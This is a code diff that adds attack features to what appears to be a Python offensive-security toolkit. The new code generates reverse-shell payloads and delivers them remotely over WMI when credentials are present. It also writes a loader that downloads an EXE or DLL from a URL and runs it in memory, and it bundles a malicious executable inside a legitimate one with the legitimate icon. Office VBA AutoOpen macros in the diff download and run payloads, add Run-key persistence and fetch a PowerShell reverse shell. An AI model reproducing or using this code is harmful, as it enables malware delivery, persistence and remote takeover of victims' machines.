@@ -27,6 +27,31 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, asdict, field
 from typing import Any, Dict, List, Optional, Tuple
+import importlib.util as _ilu
+
+# ── OnlyShell reverse shell handler ──────────────────────────────────────────
+def _local_ip() -> str:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
+        return ip
+    except Exception:
+        return "0.0.0.0"
+
+_RS_MOD = None
+def _rs():
+    global _RS_MOD
+    if _RS_MOD is not None:
+        return _RS_MOD
+    for _c in [
+        Path(__file__).parent.parent.parent / "network" / "revshell" / "revshell.py",
+        Path(__file__).parent / "revshell" / "revshell.py",
+    ]:
+        if _c.exists():
+            _s = _ilu.spec_from_file_location("revshell", _c)
+            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
+            _RS_MOD = _m; return _m
+    return None
 
 # ============================================================================
 # CAPABILITY DETECTION
@@ -2463,6 +2488,201 @@ def main() -> None:
             legit_exe_path=Path(params['legit_exe']) if params.get('legit_exe') else None)
         data['gen_all'] = result
 
+    def do_shell():
+        log("→ shell")
+        lhost    = params.get('lhost') or _local_ip()
+        lport    = int(params.get('lport', 4444))
+        serve    = str(params.get('serve', 'true')).lower() in ('true', '1', 'yes')
+        duration = int(params.get('duration', 120))
+        ptype    = params.get('payload_type', 'powershell_b64')
+        rs = _rs()
+        if rs is None:
+            errors.append("revshell module not found — check tools/network/revshell/"); return
+        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
+        if not gen.get('success'):
+            errors.append(f"payload gen failed: {gen.get('error')}"); return
+        payload_cmd = list(gen['payloads'].values())[0]
+        data['shell'] = {'lhost': lhost, 'lport': lport, 'payload_type': ptype,
+                         'payload': payload_cmd, 'listener': f"nc -lvnp {lport}"}
+        if auth.has_creds:
+            rex = RemoteExec(target, auth, timeout=30)
+            log(f"→ Delivering {ptype} to {target}…")
+            threading.Thread(target=lambda: rex.run_command(payload_cmd), daemon=True).start()
+            data['shell']['delivery'] = f'auto ({ptype} via wmiexec/WMI)'
+        else:
+            data['shell']['delivery'] = 'manual — creds required for auto-delivery'
+            log(f"→ Copy payload: {payload_cmd[:100]}")
+        log(f"→ Starting reverse shell handler on {lhost}:{lport}…")
+        if serve:
+            rs.op_serve([lport], lhost=lhost)
+        else:
+            r = rs.op_listen([lport], duration=duration, lhost=lhost)
+            data['shell']['sessions']       = r.get('sessions', [])
+            data['shell']['sessions_count'] = r.get('sessions_count', 0)
+
+    def do_fileless_pe():
+        log("→ fileless_pe")
+        url       = params.get('url', '')
+        file_type = params.get('file_type', 'exe').lower()
+        method    = params.get('method', '') if file_type == 'dll' else None
+        out_file  = params.get('output', 'PEloader.py')
+        if not url:
+            errors.append("fileless_pe requires 'url' parameter"); return
+        if file_type not in ('exe', 'dll'):
+            errors.append("file_type must be 'exe' or 'dll'"); return
+        if file_type == 'dll' and not method:
+            errors.append("fileless_pe with dll requires 'method' parameter (e.g. DLLRegisterServer)"); return
+        method_str = f'"{method}"' if method else 'None'
+        code = f"""import urllib.request
+import pythonmemorymodule
+
+def load_from_url(url, file_type, method=None):
+    req = urllib.request.Request(url)
+    buf = urllib.request.urlopen(req).read()
+    if file_type == 'dll':
+        dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
+        if method:
+            startDll = dll.get_proc_addr(method)
+            assert startDll(), f"Failed to execute '{{method}}'"
+    elif file_type == 'exe':
+        pythonmemorymodule.MemoryModule(data=buf, debug=True)
+
+if __name__ == "__main__":
+    load_from_url("{url}", "{file_type}", {method_str})
+"""
+        import pathlib
+        pathlib.Path(out_file).write_text(code)
+        data['fileless_pe'] = {
+            'output': out_file,
+            'url': url,
+            'file_type': file_type,
+            'method': method,
+            'note': 'Deploy PEloader.py to target; requires: pip install pythonmemorymodule',
+        }
+        log(f"→ PEloader written to {out_file}")
+
+    def do_inject_exe():
+        log("→ inject_exe")
+        mal_exe   = params.get('mal_exe', '')
+        legit_exe = params.get('legit_exe', '')
+        if not mal_exe or not legit_exe:
+            errors.append("inject_exe requires 'mal_exe' and 'legit_exe' parameters"); return
+        for f in (mal_exe, legit_exe):
+            if not Path(f).exists():
+                errors.append(f"inject_exe: file not found: {f}"); return
+        if not shutil.which('pyinstaller'):
+            errors.append("inject_exe requires pyinstaller: pip install pyinstaller"); return
+        import tempfile, pathlib, shutil as _shutil
+        legit_name = pathlib.Path(legit_exe).stem + "-output"
+        loader_src = f"""import os, sys, subprocess
+def base_path(path):
+    basedir = sys._MEIPASS if getattr(sys, 'frozen', None) else os.path.dirname(__file__)
+    return os.path.join(basedir, path)
+subprocess.Popen(base_path('{pathlib.Path(mal_exe).name}'), shell=True,
+                 stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+subprocess.call(base_path('{pathlib.Path(legit_exe).name}'), shell=True)
+"""
+        with tempfile.NamedTemporaryFile('w', suffix='.py', delete=False) as tf:
+            tf.write(loader_src)
+            loader_file = tf.name
+        out_dir = str(pathlib.Path(mal_exe).parent)
+        cmd = [
+            'pyinstaller', '--onefile', '--windowed',
+            f'--add-data={mal_exe};.',
+            f'--add-data={legit_exe};.',
+            f'--icon={legit_exe}',
+            f'--distpath={out_dir}',
+            f'--name={legit_name}',
+            loader_file,
+        ]
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            spec = pathlib.Path(f'{legit_name}.spec')
+            build = pathlib.Path('build')
+            if spec.exists(): spec.unlink()
+            if build.exists(): _shutil.rmtree(build)
+            output_path = str(pathlib.Path(out_dir) / f'{legit_name}.exe')
+            data['inject_exe'] = {
+                'output': output_path,
+                'mal_exe': mal_exe,
+                'legit_exe': legit_exe,
+                'success': result.returncode == 0,
+            }
+            if result.returncode != 0:
+                errors.append(f"pyinstaller failed: {result.stderr[:300]}")
+            else:
+                log(f"→ Bundled EXE: {output_path}")
+        finally:
+            pathlib.Path(loader_file).unlink(missing_ok=True)
+
+    def do_office_macros():
+        log("→ office_macros")
+        macro_type = params.get('macro_type', 'all').lower()
+        payload_url = params.get('payload_url', 'http://YOUR-SERVER/payload.exe')
+        lhost       = params.get('lhost') or _local_ip()
+        lport       = int(params.get('lport', 4444))
+        rev_url     = params.get('rev_url', f'http://{lhost}:{lport}/reverse.ps1')
+        reg_path    = params.get('reg_path', r'C:\Path\to\macro.vbs')
+        ps_command  = params.get('ps_command', 'Get-Process | Out-File -FilePath C:\\Temp\\processes.txt')
+
+        macros = {
+            'download_exec': f"""Sub AutoOpen()
+    Dim objXMLHTTP As Object, objADOStream As Object, strFilePath As String
+    strFilePath = Environ("TEMP") & "\\payload.exe"
+    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objXMLHTTP.Open "GET", "{payload_url}", False
+    objXMLHTTP.Send
+    If objXMLHTTP.Status = 200 Then
+        objADOStream.Open : objADOStream.Type = 1
+        objADOStream.Write objXMLHTTP.responseBody
+        objADOStream.Position = 0
+        objADOStream.SaveToFile strFilePath, 2
+        objADOStream.Close
+        CreateObject("WScript.Shell").Run strFilePath
+    End If
+End Sub""",
+            'hidden_cmd_exec': f"""Sub AutoOpen()
+    Dim command As String
+    command = "cmd.exe /c bitsadmin /transfer dl {payload_url} C:\\Temp\\payload.exe && start C:\\Temp\\payload.exe"
+    CreateObject("WScript.Shell").Run command, 0, False
+End Sub""",
+            'persistence': (
+                f'Sub AutoOpen()\n'
+                f'    CreateObject("WScript.Shell").RegWrite _\n'
+                f'        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecVMacro", _\n'
+                f'        "wscript.exe " & Chr(34) & "{reg_path}" & Chr(34)\n'
+                f'End Sub'
+            ),
+            'pwsh_cmd': (
+                f'Sub AutoOpen()\n'
+                f'    Dim command As String\n'
+                f'    command = "powershell.exe -WindowStyle Hidden -NoP -NonI -ExecutionPolicy Bypass -Command "'
+                f' & Chr(34) & "{ps_command}" & Chr(34)\n'
+                f'    CreateObject("WScript.Shell").Run command, 0, False\n'
+                f'End Sub'
+            ),
+            'reverse_shell': (
+                f'Sub AutoOpen()\n'
+                f'    CreateObject("WScript.Shell").Run _\n'
+                f'        "cmd.exe /c powershell -NoP -W Hidden -C " & Chr(34) & '
+                f'"IEX(New-Object Net.WebClient).DownloadString(\'{rev_url}\')" & Chr(34)\n'
+                f'End Sub'
+            ),
+        }
+
+        selected = macros if macro_type == 'all' else {macro_type: macros[macro_type]} if macro_type in macros else {}
+        if not selected:
+            errors.append(f"Unknown macro_type '{macro_type}'. Options: {list(macros.keys())} + all"); return
+
+        data['office_macros'] = {
+            'macros': selected,
+            'count': len(selected),
+            'usage': 'Paste into Office VBA editor (Alt+F11). Macro fires on document open.',
+            'note': 'Update payload_url / rev_url / reg_path / ps_command params to customise.',
+        }
+        log(f"→ Generated {len(selected)} Office VBA macro(s): {list(selected.keys())}")
+
     # ── handler dispatch ──────────────────────────────────────────────
     handlers = {
         # assessment
@@ -2505,6 +2725,11 @@ def main() -> None:
         'gen_sliver':       do_gen_sliver,
         'gen_iso':          do_gen_iso,
         'gen_all':          do_gen_all,
+        'shell':            do_shell,
+        # community contribs
+        'fileless_pe':      do_fileless_pe,
+        'inject_exe':       do_inject_exe,
+        'office_macros':    do_office_macros,
     }
 
     if operation == 'auto':
